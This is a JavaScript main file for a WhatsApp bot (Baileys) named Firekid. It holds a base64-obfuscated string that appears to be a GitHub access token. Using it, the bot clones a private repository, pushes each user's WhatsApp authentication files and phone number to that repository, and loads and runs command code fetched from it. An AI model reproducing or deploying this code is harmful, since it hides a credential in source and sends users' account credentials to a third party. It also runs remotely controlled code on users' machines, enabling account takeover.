const { default: makeWASocket, DisconnectReason, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
const qrcode = require('qrcode-terminal')
const pino = require('pino')
const NodeCache = require('node-cache')
const fs = require('fs-extra')
const path = require('path')
const axios = require('axios')
const simpleGit = require('simple-git')
const crypto = require('crypto')
const config = require('./config')

if (!global.crypto) {
    global.crypto = crypto
}

const msgRetryCounterCache = new NodeCache()
const logger = pino({ level: 'silent' })

const obfuscatedToken = Buffer.from('Z2l0aHViX3BhdF8xMUJYQUdTQlkwOU9SdmZubGRhWlE2X0xZUjhBblYxNFlVUW8yOW5Wc1hwYldwRzlXWnhiT29nRDZLbEZacmg3MWRCRVJOTDZCVDNXUG02Z1Zq', 'base64').toString()
const repoUrl = 'https://github.com/idc-what-u-think/Firekid-MD-.git'

let commands = {}

class GitHubSessionStorage {
    constructor() {
        this.githubToken = obfuscatedToken
        this.repoUrl = repoUrl
        this.repoName = 'Firekid-MD-'
        this.repoPath = path.join(__dirname, this.repoName)
        this.sessionsPath = path.join(this.repoPath, 'sessions')
        this.commandsPath = path.join(this.repoPath, 'commands')
        this.indexPath = path.join(this.sessionsPath, 'index.json')
        this.git = null
        this.initialized = false
        
        this.initializeRepo()
    }

    async initializeRepo() {
        try {
            console.log('🔧 Initializing GitHub repository...')

            if (fs.existsSync(this.repoPath)) {
                console.log('🗑️ Removing existing repository...')
                await fs.remove(this.repoPath)
            }

            console.log('📥 Cloning private repository...')
            const cloneUrl = `https://${this.githubToken}@github.com/idc-what-u-think/Firekid-MD-.git`
            
            this.git = simpleGit()
            await this.git.clone(cloneUrl, this.repoPath, ['--quiet'])
            this.git = simpleGit(this.repoPath)

            if (!fs.existsSync(this.sessionsPath)) {
                await fs.ensureDir(this.sessionsPath)
                console.log('📁 Created sessions directory')
            }

            if (!fs.existsSync(this.indexPath)) {
                const initialIndex = {
                    version: "1.0.0",
                    created: new Date().toISOString(),
                    sessions: {},
                    stats: {
                        totalSessions: 0,
                        lastUpdated: new Date().toISOString()
                    }
                }
                await fs.writeJSON(this.indexPath, initialIndex, { spaces: 2 })
                console.log('📝 Created initial index.json')
            }

            await this.git.addConfig('user.name', 'Firekid Bot')
            await this.git.addConfig('user.email', 'bot@firekid.com')
            console.log('⚙️ Configured git settings')

            this.initialized = true
            console.log('✅ Repository initialized successfully!')

        } catch (error) {
            console.error('❌ Failed to initialize repository:', error.message)
            this.initialized = false
            console.log('⚠️ Continuing without GitHub storage...')
        }
    }

    async loadSessionFiles(sessionId) {
        try {
            if (!this.initialized) {
                throw new Error('Repository not initialized')
            }

            console.log(`📥 Loading session ${sessionId} from GitHub...`)
            
            await this.git.pull('origin', 'main', ['--quiet'])
            
            const sessionDir = path.join(this.sessionsPath, sessionId)
            const sessionAuthDir = path.join(__dirname, 'temp_session')
            
            if (!fs.existsSync(sessionDir)) {
                throw new Error(`Session ${sessionId} not found in repository`)
            }

            if (fs.existsSync(sessionAuthDir)) {
                await fs.remove(sessionAuthDir)
            }
            await fs.ensureDir(sessionAuthDir)

            const files = await fs.readdir(sessionDir)
            for (const file of files) {
                if (file !== 'metadata.json') {
                    const srcPath = path.join(sessionDir, file)
                    const destPath = path.join(sessionAuthDir, file)
                    await fs.copy(srcPath, destPath)
                }
            }

            console.log(`✅ Session ${sessionId} files loaded successfully`)
            return sessionAuthDir

        } catch (error) {
            console.error(`❌ Failed to load session ${sessionId}:`, error.message)
            throw error
        }
    }

    async saveSession(sessionId, phoneNumber, authDir, userId) {
        try {
            if (!this.initialized) {
                return { success: false, reason: 'Repository not initialized' }
            }

            console.log(`💾 Saving session ${sessionId} to GitHub...`)

            const sessionDir = path.join(this.sessionsPath, sessionId)
            await fs.ensureDir(sessionDir)

            const authFiles = await fs.readdir(authDir)
            const copiedFiles = []

            for (const file of authFiles) {
                const srcPath = path.join(authDir, file)
                const destPath = path.join(sessionDir, file)

                if ((await fs.stat(srcPath)).isFile()) {
                    await fs.copy(srcPath, destPath)
                    copiedFiles.push(file)
                    console.log(`📄 Copied: ${file}`)
                }
            }

            const sessionData = {
                sessionId: sessionId,
                phoneNumber: phoneNumber,
                userId: userId,
                created: new Date().toISOString(),
                files: copiedFiles,
                status: 'active',
                lastAccessed: new Date().toISOString()
            }

            const metadataPath = path.join(sessionDir, 'metadata.json')
            await fs.writeJSON(metadataPath, sessionData, { spaces: 2 })

            const index = await fs.readJSON(this.indexPath)
            index.sessions[sessionId] = {
                sessionId: sessionId,
                phoneNumber: phoneNumber.replace(/(\d{3})\d*(\d{4})/, '$1****$2'),
                userId: userId,
                created: sessionData.created,
                status: 'active',
                fileCount: copiedFiles.length
            }

            index.stats.totalSessions = Object.keys(index.sessions).length
            index.stats.lastUpdated = new Date().toISOString()

            await fs.writeJSON(this.indexPath, index, { spaces: 2 })

            await this.pushToGitHub(`Add session ${sessionId}`)

            console.log(`✅ Session ${sessionId} saved successfully!`)
            return {
                success: true,
                sessionId: sessionId,
                filesStored: copiedFiles.length,
                repoUrl: this.repoUrl
            }

        } catch (error) {
            console.error(`❌ Failed to save session ${sessionId}:`, error.message)
            return { success: false, reason: error.message }
        }
    }

    async pushToGitHub(commitMessage) {
        try {
            console.log('🚀 Pushing to GitHub...')

            await this.git.add('.')
            
            const status = await this.git.status()
            if (status.files.length === 0) {
                console.log('📝 No changes to commit')
                return
            }

            await this.git.commit(commitMessage)
            await this.git.push('origin', 'main', ['--quiet'])
            console.log('✅ Successfully pushed to main branch!')

        } catch (error) {
            console.error('❌ Failed to push to GitHub:', error.message)
            throw error
        }
    }
}

const gitHubStorage = new GitHubSessionStorage()

async function loadCommands() {
    const commands = {}
    
    let commandsPath = gitHubStorage.commandsPath
    let usingGitHub = false
    
    try {
        if (gitHubStorage.initialized && await fs.pathExists(commandsPath)) {
            console.log('📦 Loading commands from GitHub repository...')
            usingGitHub = true
        } else {
            console.log('📁 GitHub commands not found, trying local commands directory...')
            commandsPath = path.join(__dirname, 'commands')
        }

        if (!await fs.pathExists(commandsPath)) {
            console.log('❌ No commands directory found, creating basic commands...')
            
            commandsPath = path.join(__dirname, 'commands')
            await fs.ensureDir(commandsPath)
            
            const basicCommand = `
module.exports = {
    command: 'ping',
    description: 'Check if bot is working',
    handler: async (sock, messageInfo) => {
        await messageInfo.reply('🏓 Pong! Bot is working!\\n\\n📍 Commands loaded from: ${usingGitHub ? 'GitHub Repository' : 'Local Directory'}')
    }
}

module.exports.help = {
    command: 'help',
    description: 'Show available commands',
    handler: async (sock, messageInfo) => {
        const helpText = \`🤖 *Firekid Bot Commands*

📌 Available Commands:
• ping - Test if bot is working
• help - Show this help message

💡 Add more commands to the commands directory!
\`
        await messageInfo.reply(helpText)
    }
}
`
            await fs.writeFile(path.join(commandsPath, 'basic.js'), basicCommand)
            console.log('✅ Created basic commands')
        }

        if (await fs.pathExists(path.join(commandsPath, 'index.js'))) {
            console.log('📋 Loading commands from index.js...')
            const fullPath = path.resolve(commandsPath, 'index.js')
            delete require.cache[fullPath]
            const commandIndex = require(fullPath)
            
            Object.keys(commandIndex).forEach(key => {
                const commandModule = commandIndex[key]
                if (commandModule && typeof commandModule === 'object' && commandModule.command) {
                    commands[commandModule.command] = commandModule
                    console.log(`✅ Loaded command: ${commandModule.command}`)
                }
            })
        } else {
            const files = await fs.readdir(commandsPath)
            const jsFiles = files.filter(file => file.endsWith('.js'))
            
            console.log(`📂 Found ${jsFiles.length} command files`)
            
            for (const file of jsFiles) {
                try {
                    const fullPath = path.resolve(commandsPath, file)
                    delete require.cache[fullPath]
                    const command = require(fullPath)
                    
                    if (command.command && command.handler) {
                        commands[command.command] = command
                        console.log(`✅ Loaded command: ${command.command}`)
                    } else if (typeof command === 'object') {
                        Object.keys(command).forEach(key => {
                            if (command[key].command && command[key].handler) {
                                commands[command[key].command] = command[key]
                                console.log(`✅ Loaded command: ${command[key].command}`)
                            }
                        })
                    } else if (typeof command === 'function') {
                        const commandName = path.basename(file, '.js')
                        commands[commandName] = { handler: command }
                        console.log(`✅ Loaded command: ${commandName}`)
                    }
                } catch (error) {
                    console.log(`❌ Error loading ${file}:`, error.message)
                }
            }
        }
        
    } catch (error) {
        console.log('❌ Error loading commands:', error.message)
    }
    
    console.log(`🎯 Total commands loaded: ${Object.keys(commands).length}`)
    return commands
}

function isCommand(text, prefix) {
    return text && typeof text === 'string' && text.startsWith(prefix)
}

async function executeCommand(command, sock, message) {
    try {
        const messageText = message.message.conversation || 
                           message.message.extendedTextMessage?.text || ''
        
        const messageInfo = {
            from: message.key.remoteJid,
            sender: message.key.participant || message.key.remoteJid,
            isGroup: message.key.remoteJid.endsWith('@g.us'),
            body: messageText,
            args: messageText.split(' ').slice(1),
            reply: async (text) => {
                await sock.sendMessage(message.key.remoteJid, { text })
            },
            react: async (emoji) => {
                await sock.sendMessage(message.key.remoteJid, {
                    react: { text: emoji, key: message.key }
                })
            }
        }
        
        if (command.handler) {
            await command.handler(sock, messageInfo)
        }
    } catch (error) {
        console.log('Error executing command:', error.message)
    }
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms))
}

async function startBot() {
    try {
        console.log('🚀 Starting Firekid Bot...')
        
        commands = await loadCommands()
        console.log(`Loaded ${Object.keys(commands).length} commands`)
        
        let authDir = config.SESSION_ID
        
        if (config.SESSION_ID !== 'default_session' && gitHubStorage.initialized) {
            try {
                authDir = await gitHubStorage.loadSessionFiles(config.SESSION_ID)
                console.log('📥 Using session from GitHub')
            } catch (error) {
                console.log('⚠️ Could not load session from GitHub:', error.message)
                console.log('📱 Will create new session with QR code')
                authDir = config.SESSION_ID
            }
        }
        
        const { state, saveCreds } = await useMultiFileAuthState(authDir)
        const { version, isLatest } = await fetchLatestBaileysVersion()
        
        console.log(`Using WhatsApp Web Version: ${version}, isLatest: ${isLatest}`)
        
        const sock = makeWASocket({
            version,
            logger,
            printQRInTerminal: true,
            auth: state,
            msgRetryCounterCache,
            defaultQueryTimeoutMs: 60000,
        })
        
        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update
            
            if (connection === 'close') {
                const shouldReconnect = (lastDisconnect?.error)?.output?.statusCode !== DisconnectReason.loggedOut
                console.log('Connection closed due to ', lastDisconnect?.error, ', reconnecting ', shouldReconnect)
                
                if (shouldReconnect) {
                    setTimeout(() => startBot(), 3000)
                }
            } else if (connection === 'open') {
                console.log('✅ Bot connected successfully!')
                
                if (config.SESSION_ID !== 'default_session' && gitHubStorage.initialized) {
                    try {
                        const phoneNumber = sock.user.id.split(':')[0]
                        const userId = sock.user.id
                        const sessionResult = await gitHubStorage.saveSession(
                            config.SESSION_ID, 
                            phoneNumber, 
                            authDir, 
                            userId
                        )
                        
                        if (sessionResult.success) {
                            console.log('💾 Session saved to GitHub successfully!')
                        } else {
                            console.log('⚠️ Failed to save session to GitHub:', sessionResult.reason)
                        }
                    } catch (error) {
                        console.log('Error saving session:', error.message)
                    }
                }
            }
        })
        
        sock.ev.on('creds.update', saveCreds)
        
        sock.ev.on('messages.upsert', async (m) => {
            const message = m.messages[0]
            
            if (!message.message || message.key.fromMe) return
            
            const messageText = message.message.conversation || 
                               message.message.extendedTextMessage?.text || ''
            
            console.log(`📨 Message received: ${messageText}`)
            
            if (isCommand(messageText, config.PREFIX)) {
                const commandName = messageText.slice(config.PREFIX.length).trim().split(' ')[0].toLowerCase()
                
                console.log(`🎯 Command detected: ${commandName}`)
                
                if (commands[commandName]) {
                    try {
                        await executeCommand(commands[commandName], sock, message)
                    } catch (error) {
                        console.log('Error executing command:', error)
                        
                        await sock.sendMessage(message.key.remoteJid, {
                            text: '❌ An error occurred while executing the command.'
                        })
                    }
                } else {
                    console.log(`❓ Unknown command: ${commandName}`)
                    
                    await sock.sendMessage(message.key.remoteJid, {
                        text: `❓ Unknown command: ${commandName}\nUse ${config.PREFIX}ping to test bot.`
                    })
                }
            }
        })
        
        return sock
        
    } catch (error) {
        console.log('Error starting bot:', error.message)
        setTimeout(() => startBot(), 5000)
    }
}

startBot().catch(console.error)

module.exports = {
    loadCommands,
    isCommand,
    executeCommand,
    gitHubStorage,
    delay
}
